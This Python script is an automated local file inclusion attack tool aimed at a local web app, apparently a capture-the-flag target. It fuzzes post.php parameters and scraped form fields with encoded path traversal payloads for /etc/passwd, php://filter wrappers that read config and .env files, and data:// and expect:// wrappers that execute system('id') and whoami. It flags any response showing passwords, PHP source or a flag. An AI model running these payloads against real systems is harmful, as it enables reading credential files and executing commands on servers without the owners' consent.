import requests
import re
import json
import base64
import urllib.parse
from bs4 import BeautifulSoup

# Configuration - use the target from context
BASE_URL = "http://127.0.0.1:33209"
HEADERS = {"User-Agent": "Mozilla/5.0 (Aggressive-LFI-Test)"}

# Color codes
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

# Advanced LFI payloads with various encodings
def get_advanced_lfi_payloads():
    payloads = []
    
    # Standard traversal payloads
    base_traversals = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",  # URL encoded
        "..%252f..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # Full URL encode
        "....//....//....//....//etc/passwd",  # Double dot slash
        "..\\..\\..\\..\\etc\\passwd",  # Backslash
        "..%5c..%5c..%5c..%5cetc%5cpasswd",  # URL encoded backslash
        "/etc/passwd",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Unicode bypass
        "..%252f..%252f..%252f..%252fetc%252fpasswd%00",  # Null byte
    ]
    
    # PHP wrapper payloads
    wrapper_payloads = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "php://filter/read=convert.base64-encode/resource=post.php",
        "php://filter/read=convert.base64-encode/resource=.env",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "data://text/plain,<?php system('id');?>",
        "expect://id",
        "file:///etc/passwd",
    ]
    
    # Encoded payloads
    encoded = []
    for payload in base_traversals:
        # Base64 encode
        b64 = base64.b64encode(payload.encode()).decode()
        encoded.append(f"data://text/plain;base64,{b64}")
        
        # Rot13
        rot13 = payload.translate(str.maketrans(
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
            "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"
        ))
        # Add more encoding variations
        encoded.append(payload.replace("../", "..%2f"))
        encoded.append(payload.replace("../", "..%252f"))
    
    # Combine all
    payloads.extend(base_traversals)
    payloads.extend(wrapper_payloads)
    payloads.extend(encoded)
    
    # Remove duplicates while preserving order
    seen = set()
    unique_payloads = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            unique_payloads.append(p)
    
    return unique_payloads[:30]  # Limit to prevent timeout

# Parameter list for post.php specifically
def get_post_parameters():
    return ["post", "article", "content", "id", "page", "file"]

# Test if response shows LFI indicators
def is_lfi_success(response):
    if response is None:
        return False, []
    
    content = response.text
    indicators = []
    
    # Success indicators
    if "root:" in content and "bin:" in content:
        indicators.append("etc_passwd_content")
    if "PD9waHA" in content or "<?php" in content:
        indicators.append("php_source_code")
    if "DB_PASSWORD" in content or "mysql" in content.lower():
        indicators.append("config_data")
    if "flag{" in content.lower():
        indicators.append("flag_found")
    if "uid=" in content and "gid=" in content:
        indicators.append("system_info")
    
    return len(indicators) > 0, indicators

# Test each payload and parameter combination
def test_post_php_injection():
    print(f"\n{Colors.BLUE}[*] AGGRESSIVE LFI TEST - post.php{Colors.RESET}")
    print("="*80)
    
    post_url = f"{BASE_URL}/post.php"
    vulnerabilities = []
    
    try:
        # First, get baseline response
        baseline_resp = requests.get(post_url, headers=HEADERS, timeout=5)
        baseline_size = len(baseline_resp.content)
        print(f"[+] post.php baseline - Status: {baseline_resp.status_code}, Size: {baseline_size}B")
        
        # If post.php is very small, it might be doing something dynamic
        if baseline_size < 50:
            print(f"{Colors.YELLOW}[!] post.php is very small ({baseline_size}B) - likely dynamic{Colors.RESET}")
        
    except Exception as e:
        print(f"[-] Error accessing post.php: {e}")
        return []
    
    # Test parameters
    params = get_post_parameters()
    payloads = get_advanced_lfi_payloads()
    
    total_tests = len(params) * len(payloads)
    print(f"[+] Testing {len(params)} parameters × {len(payloads)} payloads = {total_tests} combinations")
    
    for param_idx, param in enumerate(params):
        print(f"\n{Colors.YELLOW}[Testing parameter: {param}]{Colors.RESET}")
        
        for payload_idx, payload in enumerate(payloads):
            # Show progress
            if (payload_idx + 1) % 5 == 0:
                print(f"  Testing {param}: {payload_idx + 1}/{len(payloads)} payloads", end='\r')
            
            # Test GET
            try:
                resp_get = requests.get(
                    post_url,
                    params={param: payload},
                    headers=HEADERS,
                    timeout=8
                )
                
                is_vuln_get, indicators_get = is_lfi_success(resp_get)
                if is_vuln_get:
                    print(f"\n  {Colors.GREEN}[+] GET SUCCESS with '{param}'{Colors.RESET}")
                    print(f"    Payload: {payload}")
                    print(f"    Indicators: {', '.join(indicators_get)}")
                    print(f"    Response preview: {resp_get.text[:100]}...")
                    
                    vuln = {
                        'parameter': param,
                        'method': 'GET',
                        'payload': payload,
                        'indicators': indicators_get,
                        'full_response': resp_get.text
                    }
                    vulnerabilities.append(vuln)
            except Exception as e:
                continue
            
            # Test POST
            try:
                resp_post = requests.post(
                    post_url,
                    data={param: payload},
                    headers=HEADERS,
                    timeout=8
                )
                
                is_vuln_post, indicators_post = is_lfi_success(resp_post)
                if is_vuln_post:
                    print(f"\n  {Colors.GREEN}[+] POST SUCCESS with '{param}'{Colors.RESET}")
                    print(f"    Payload: {payload}")
                    print(f"    Indicators: {', '.join(indicators_post)}")
                    print(f"    Response preview: {resp_post.text[:100]}...")
                    
                    vuln = {
                        'parameter': param,
                        'method': 'POST',
                        'payload': payload,
                        'indicators': indicators_post,
                        'full_response': resp_post.text
                    }
                    vulnerabilities.append(vuln)
            except Exception as e:
                continue
    
    return vulnerabilities

# Test parameter pollution specifically
def test_parameter_pollution():
    print(f"\n{Colors.BLUE}[*] PARAMETER POLLUTION TEST{Colors.RESET}")
    print("="*80)
    
    post_url = f"{BASE_URL}/post.php"
    results = []
    
    # Create pollution with multiple parameters containing LFI
    pollution_tests = [
        {
            'name': 'multi_param_traversal',
            'params': {
                'post': '../../../etc/passwd',
                'article': '../../../etc/group',
                'content': '../../../etc/hostname'
            }
        },
        {
            'name': 'mixed_payloads',
            'params': {
                'post': 'php://filter/convert.base64-encode/resource=config.php',
                'id': 'expect://id',
                'page': 'data://text/plain,<?php system("whoami");?>'
            }
        },
        {
            'name': 'duplicate_param',
            'params': [
                ('file', '../../../etc/passwd'),
                ('file', 'php://filter/convert.base64-encode/resource=index.php')
            ]
        }
    ]
    
    for test in pollution_tests:
        try:
            if isinstance(test['params'], dict):
                resp = requests.get(post_url, params=test['params'], headers=HEADERS, timeout=10)
            else:  # List of tuples (duplicate params)
                resp = requests.get(post_url, params=test['params'], headers=HEADERS, timeout=10)
            
            is_vuln, indicators = is_lfi_success(resp)
            
            print(f"\n[+] Test: {test['name']}")
            print(f"    Status: {resp.status_code}")
            print(f"    Size: {len(resp.content)}B")
            
            if is_vuln:
                print(f"    {Colors.GREEN}SUCCESS - Indicators: {indicators}{Colors.RESET}")
                print(f"    Response: {resp.text[:150]}...")
                results.append({
                    'test_name': test['name'],
                    'indicators': indicators,
                    'response': resp.text
                })
            else:
                print(f"    Response different from baseline: {len(resp.content) != 22}")
                
        except Exception as e:
            print(f"    Error: {str(e)}")
    
    return results

# Extract and test paths from index.php
def extract_and_test_paths():
    print(f"\n{Colors.BLUE}[*] EXTRACTING PATHS FROM INDEX.PHP{Colors.RESET}")
    print("="*80)
    
    try:
        resp = requests.get(f"{BASE_URL}/index.php", headers=HEADERS, timeout=5)
        if resp.status_code != 200:
            print("[-] Cannot access index.php")
            return []
        
        print(f"[+] index.php loaded ({len(resp.content)}B)")
        
        # Extract forms and links
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = soup.find_all('form')
        print(f"[+] Found {len(forms)} forms")
        
        vulnerabilities = []
        
        # Test each form
        for form_idx, form in enumerate(forms):
            action = form.get('action', 'post.php')
            method = form.get('method', 'GET').upper()
            form_url = f"{BASE_URL}/{action}"
            
            print(f"\n[Form {form_idx+1}] {method} {form_url}")
            
            # Extract parameters
            params = {}
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name')
                if name:
                    params[name] = '../../../etc/passwd'  # Test value
                    print(f"  Parameter: {name}")
            
            # Test the form
            if params:
                try:
                    if method == 'GET':
                        form_resp = requests.get(form_url, params=params, headers=HEADERS, timeout=8)
                    else:
                        form_resp = requests.post(form_url, data=params, headers=HEADERS, timeout=8)
                    
                    is_vuln, indicators = is_lfi_success(form_resp)
                    if is_vuln:
                        print(f"  {Colors.GREEN}[+] VULNERABLE - Indicators: {indicators}{Colors.RESET}")
                        vulnerabilities.append({
                            'type': 'form',
                            'method': method,
                            'url': form_url,
                            'params': list(params.keys()),
                            'indicators': indicators
                        })
                    else:
                        print(f"  Status: {form_resp.status_code}, Size: {len(form_resp.content)}B")
                        
                except Exception as e:
                    print(f"  Error testing form: {e}")
        
        # Also look for JavaScript fetch/XHR calls
        js_matches = re.findall(r'fetch\(["\']([^"\']+)["\'].*?\{[^}]*method:\s*["\'](GET|POST)["\']', resp.text, re.I | re.S)
        for match in js_matches:
            endpoint = match[0] if isinstance(match, tuple) else match
            method = match[1] if isinstance(match, tuple) else 'GET'
            
            if endpoint.startswith('/'):
                print(f"\n[+] Found JS endpoint: {method} {endpoint}")
                
                # Test with parameters
                test_url = f"{BASE_URL}{endpoint}"
                try:
                    js_resp = requests.request(method, test_url, params={'test': '../../../etc/passwd'}, headers=HEADERS, timeout=5)
                    is_vuln, indicators = is_lfi_success(js_resp)
                    if is_vuln:
                        print(f"  {Colors.GREEN}[+] VULNERABLE - Indicators: {indicators}{Colors.RESET}")
                        vulnerabilities.append({
                            'type': 'js_endpoint',
                            'method': method,
                            'url': test_url,
                            'indicators': indicators
                        })
                except:
                    pass
        
        return vulnerabilities
        
    except Exception as e:
        print(f"[-] Error extracting paths: {e}")
        return []

# Main execution
def main():
    print(f"{Colors.BLUE}{'='*80}{Colors.RESET}")
    print(f"{Colors.BLUE}AGGRESSIVE LFI DISCOVERY SCRIPT{Colors.RESET}")
    print(f"{Colors.BLUE}Target: {BASE_URL}{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*80}{Colors.RESET}")
    
    all_findings = {
        'direct_injection': [],
        'parameter_pollution': [],
        'form_based': [],
        'extracted_endpoints': []
    }
    
    # Test 1: Direct injection post.php
    print(f"\n{Colors.RED}[PHASE 1] DIRECT INJECTION TESTING{Colors.RESET}")
    vulns = test_post_php_injection()
    all_findings['direct_injection'] = vulns
    
    # Test 2: Parameter pollution
    print(f"\n{Colors.RED}[PHASE 2] PARAMETER POLLUTION TESTING{Colors.RESET}")
    poll_results = test_parameter_pollution()
    all_findings['parameter_pollution'] = poll_results
    
    # Test 3: Extract from index.php and test
    print(f"\n{Colors.RED}[PHASE 3] INDEX.PHP ANALYSIS{Colors.RESET}")
    form_vulns = extract_and_test_paths()
    all_findings['form_based'] = form_vulns
    
    # Summary
    print(f"\n{Colors.BLUE}{'='*80}{Colors.RESET}")
    print(f"{Colors.BLUE}FINAL RESULTS SUMMARY{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*80}{Colors.RESET}")
    
    total_vulns = len(vulns) + len(poll_results) + len(form_vulns)
    
    print(f"\n{Colors.GREEN}[+] Total Vulnerabilities Found: {total_vulns}{Colors.RESET}")
    
    if vulns:
        print(f"\n{Colors.RED}[+] Direct Injection Vulnerabilities:{Colors.RESET}")
        for v in vulns:
            print(f"\n  Parameter: {v['parameter']}")
            print(f"  Method: {v['method']}")
            print(f"  Payload: {v['payload']}")
            if 'flag{' in v.get('full_response', '').lower():
                print(f"  {Colors.GREEN}[!] FLAG POTENTIALLY FOUND{Colors.RESET}")
    
    if poll_results:
        print(f"\n{Colors.RED}[+] Parameter Pollution:{Colors.RESET}")
        for p in poll_results:
            print(f"  Test: {p['test_name']}")
            if 'flag{' in p.get('response', '').lower():
                print(f"  {Colors.GREEN}[!] FLAG POTENTIALLY FOUND{Colors.RESET}")
    
    if form_vulns:
        print(f"\n{Colors.RED}[+] Form-Based Vulnerabilities:{Colors.RESET}")
        for f in form_vulns:
            print(f"  URL: {f['url']}")
            print(f"  Method: {f['method']}")
            if 'flag{' in str(f).lower():
                print(f"  {Colors.GREEN}[!] FLAG POTENTIALLY FOUND{Colors.RESET}")
    
    # Save detailed results
    with open('/tmp/aggressive_lfi_results.json', 'w') as f:
        json.dump(all_findings, f, indent=2, default=str)
    
    print(f"\n{Colors.BLUE}[*] Full results saved to /tmp/aggressive_lfi_results.json{Colors.RESET}")
    
    if total_vulns == 0:
        print(f"\n{Colors.RED}[-] No LFI vulnerabilities found with current payloads{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Consider testing with custom application parameters{Colors.RESET}")
    
    return all_findings

if __name__ == "__main__":
    main()
